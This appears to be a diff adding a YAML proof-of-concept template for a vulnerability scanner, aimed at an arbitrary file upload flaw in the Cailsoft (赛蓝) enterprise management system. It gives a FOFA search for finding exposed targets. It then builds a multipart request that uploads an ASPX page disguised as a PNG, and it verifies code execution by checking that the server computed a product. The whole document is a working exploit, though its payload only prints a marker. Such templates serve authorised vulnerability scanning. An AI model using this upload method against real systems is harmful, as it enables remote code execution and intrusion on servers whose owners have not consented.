@@ -1,0 +1,46 @@
+id: poc-yaml-cailsoft-submituploadify-upload
+info:
+  name: 赛蓝企业管理系统SubmitUploadify 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 企业管理系统
+  fofa: body="www.cailsoft.com"||body="赛蓝企业管理系统"
+variables:
+  t1: random_int(100,1000)
+  t2: random_int(100,1000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /EHRModule/EHR_Holidays/SubmitUploadify?FolderId=1&UserId=1
+  headers:
+    Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+  data: '-----------------------------142851345723692939351758052805
+
+    Content-Disposition: form-data; name="Filedata"; filename="rce.aspx"
+
+    Content-Type: image/png
+
+
+    <%@ Page Language="Jscript" validateRequest="false" %>
+
+    This website has a vulnerability
+
+    <%Response.Write({{.t1}} * {{.t2}});%>
+
+    -----------------------------142851345723692939351758052805--'
+  output:
+  - regex_match(body,"/Resource/UploadFile/AppFiles/(?P<filepath>.*?).aspx")
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /Resource/UploadFile/AppFiles/{{.filepath}}.aspx
+  expression: 'status_code == 200 &&
+
+    contains(body,"This website has a vulnerability") &&
+
+    contains(body,t3)
+
+    '
+transport: http
